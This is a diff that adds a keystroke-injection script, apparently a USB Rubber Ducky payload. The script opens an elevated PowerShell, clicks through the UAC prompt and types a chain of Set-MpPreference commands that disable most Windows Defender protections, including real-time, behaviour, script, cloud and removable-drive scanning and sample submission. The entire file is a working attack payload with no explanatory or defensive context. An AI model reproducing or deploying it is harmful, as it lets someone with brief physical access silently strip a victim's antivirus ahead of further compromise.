@@ -1,0 +1,14 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING start-process PowerShell -verb runas; exit
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIntrusionPreventionSystem $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled; Set-MpPreference -EnableNetworkProtection AuditMode; Set-MpPreference -ForceSecureBootCheck $false; Set-MpPreference -MAPSReporting Disabled; Set-MpPreference -SubmitSamplesConsent NeverSend; Set-MpPreference -DisableArchiveScanning $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableRemovableDriveScanning $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -PUAProtection Disabled; Set-MpPreference -DisableCloudBasedProtection $true; Set-MpPreference -HighThreatDefaultAction Block; Set-MpPreference -ModerateThreatDefaultAction Block; Set-MpPreference -LowThreatDefaultAction Block; Set-MpPreference -SevereThreatDefaultAction Block
+ENTER
